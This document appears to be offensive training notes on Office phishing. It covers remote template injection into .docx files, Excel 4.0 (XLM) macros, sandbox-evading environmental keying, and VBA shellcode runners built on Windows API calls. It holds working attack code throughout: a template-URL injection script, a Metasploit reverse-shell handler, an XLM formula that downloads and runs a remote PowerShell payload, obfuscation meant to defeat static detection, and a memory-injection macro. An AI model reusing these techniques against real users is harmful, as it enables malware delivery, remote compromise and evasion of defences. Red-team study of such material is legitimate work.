# Advanced Office Phishing — Remote Template Injection & XLM Macros

These techniques bypass the initial "this document has macros" warning by separating the lure document from the execution mechanism.

---

## Method 1: Remote Template Injection

**The concept:** A benign `.docx` file (no macros) contains a reference to a `.dotm` (template with macros) hosted on your server. When the victim opens the `.docx`, Word automatically downloads and loads the template — including its macros — and executes them. The `.docx` file passes static analysis because it contains no macros itself.

**Chain:**
1. Victim opens clean `Invoice.docx`
2. Word fetches `http://attacker/template.dotm` (the "template")
3. Template macros execute silently

### Step 1: Create the Malicious Template (.dotm)

```
# In Word:
1. File → New → Blank Document
2. Developer tab → Visual Basic → Insert Module
3. Paste your VBA macro (from XorShellcodeRunner.vba or WordPsCradle.vbs)
4. File → Save As → Word Macro-Enabled Template (.dotm)
   Save as: template.dotm
5. Place template.dotm in your Kali web server root
```

### Step 2: Create the Lure Document (.docx) — Edit the XML

```bash
# Create a blank .docx first (or use any existing .docx)
# .docx files are ZIP archives — unzip to edit:
cp lure.docx /tmp/lure_template.zip
cd /tmp && mkdir lure_edit && cp lure_template.zip lure_edit/
cd lure_edit && unzip lure_template.zip

# Edit the template reference:
# File: word/_rels/settings.xml.rels
# If this file doesn't exist, create it
cat > word/_rels/settings.xml.rels << 'EOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
    Target="http://192.168.45.202/template.dotm"
    TargetMode="External"/>
</Relationships>
EOF

# Also edit word/settings.xml to reference this relationship:
# Ensure settings.xml contains:
# <w:attachedTemplate r:id="rId1"/>

# Repack:
cd /tmp/lure_edit
zip -r ../Invoice_Q1.docx . -x "*.DS_Store"

# Serve:
python3 -m http.server 80
```

### Step 3: Serve and Monitor

```bash
# Kali: serve both files
sudo python3 -m http.server 80
# or: sudo apache2ctl start && cp template.dotm /var/www/html/

# Start your handler:
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 192.168.45.202
set LPORT 443
run -j

# When victim opens Invoice_Q1.docx:
# → Word fetches /template.dotm
# → Macros execute
# → Session opens
```

### Python Script to Inject Template URL

```python
#!/usr/bin/env python3
"""Injects a remote template URL into an existing .docx file."""
import zipfile, shutil, os, sys

def inject_template(docx_path, template_url, output_path):
    shutil.copy(docx_path, output_path)

    settings_rel = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
    Target="{url}"
    TargetMode="External"/>
</Relationships>'''.format(url=template_url)

    settings_entry = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"
            xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <w:attachedTemplate r:id="rId1"/>
</w:settings>'''

    with zipfile.ZipFile(output_path, 'a') as z:
        z.writestr('word/_rels/settings.xml.rels', settings_rel)
        # Overwrite settings.xml if needed — this is simplified
        # In practice: read existing settings.xml and inject the element

    print(f"[+] Template URL injected: {template_url}")
    print(f"[+] Output: {output_path}")

if __name__ == "__main__":
    inject_template("lure.docx", "http://192.168.45.202/template.dotm", "Invoice_Q1.docx")
```

---

## Method 2: XLM (Excel 4.0) Macros

XLM macros are a legacy Excel feature from the 1990s. They run in a separate sheet and are harder to detect than VBA because many AV products don't analyze them thoroughly.

**When to use:** When VBA is blocked by Group Policy (`Block macros from running in Office files from the internet`) but XLM is not (common misconfiguration).

### Create XLM Macro in Excel

```
# In Excel:
1. Right-click any sheet tab → Insert → MS Excel 4.0 Macro
   (This creates a hidden "MACRO1" sheet — Excel 4.0 Macro Sheet)
2. In cell A1 of the macro sheet, enter formulas:

=EXEC("cmd.exe /c powershell -w hidden -enc PAYLOAD_B64")
=ALERT("Document processing complete.")
=HALT()

# Then: name cell A1 as "Auto_Open" (makes it run automatically)
# Formulas tab → Name Manager → New → Name: "Auto_Open", Refers to: =MACRO1!$A$1
```

### XLM Formula for In-Memory Execution

```
# Cell A1: Download and execute PS1 (no file written):
=EXEC("cmd /c powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.45.202/payload.ps1')")

# Cell A2: Success message to avoid suspicion:
=ALERT("Spreadsheet loaded successfully")

# Cell A3: Stop execution:
=HALT()
```

### XLM Obfuscation (Evade Static Detection)

```
# Split command across multiple cells:
A1: =CHAR(99)&CHAR(109)&CHAR(100)  ← "cmd"
A2: =A1&" /c powershell..."
A3: =EXEC(A2)
A4: =HALT()

# Use FORMULA to write content to cells (indirect execution):
A1: =FORMULA("=EXEC(""cmd /c powershell -enc PAYLOAD"")",B1)
A2: =GOTO(B1)

# Environment keying — only execute if machine name matches:
A1: =IF(GET.WORKSPACE(1)="TARGETPC",EXEC("cmd /c ..."),HALT())
```

---

## Method 3: Environmental Keying in VBA

Add a check at the start of the macro that only executes if the environment matches. Prevents sandbox analysis.

```vba
Sub AutoOpen()
    ' Environmental keying — abort if in sandbox
    Dim computerName As String
    computerName = Environ("COMPUTERNAME")

    ' Only run on corp machines (domain check):
    Dim domainName As String
    domainName = Environ("USERDOMAIN")
    If InStr(domainName, "CORP") = 0 Then Exit Sub    ' Not in CORP domain

    ' Username check (abort if generic sandbox user):
    Dim userName As String
    userName = Environ("USERNAME")
    If userName = "admin" Or userName = "user" Or userName = "sandbox" Then Exit Sub

    ' Screen resolution check (sandboxes often have tiny screens):
    If Application.UsableWidth < 400 Then Exit Sub

    ' Recent files check (real user has recent documents):
    If Application.RecentFiles.Count < 3 Then Exit Sub

    ' Passed all checks — execute payload:
    Dim wmi As Object
    Set wmi = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
    wmi.Create "powershell.exe -w hidden -enc PAYLOAD_B64"
End Sub
```

---

## Method 4: VBA P/Invoke (No WScript.Shell — Less Monitored)

Call Windows APIs directly from VBA using `Declare` statements.

```vba
' Declare Windows API functions:
#If Win64 Then
    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As LongLong, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal dest As LongPtr, ByRef src As Any, ByVal size As LongLong) As LongPtr
    Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As LongLong, ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As LongPtr
#End If

Sub AutoOpen()
    ' Shellcode bytes go here (XOR encoded, decoded at runtime):
    Dim buf() As Byte
    ' ... (paste encoded shellcode array here)

    ' Allocate RWX memory:
    Dim mem As LongPtr
    mem = VirtualAlloc(0, UBound(buf) + 1, &H3000, &H40)

    ' Copy shellcode:
    RtlMoveMemory mem, buf(0), UBound(buf) + 1

    ' Execute:
    Dim tid As Long
    CreateThread 0, 0, mem, 0, 0, tid
End Sub
```

---

## Delivery Summary

| Technique | Detection Risk | MOTW Bypass? | Requires |
|-----------|---------------|--------------|---------|
| Remote Template Injection | Low | No | Web server with .dotm |
| XLM Macros | Low-Medium | No | Excel with XLM support |
| VBA P/Invoke | Medium | No | Macros enabled |
| ISO container | Low | **Yes** | Victim double-clicks .iso |
| ZIP password-protected | Low | **Yes** | Victim extracts with 7-Zip |
| OneNote attachment | Medium | Patched (2023) | Old OneNote version |
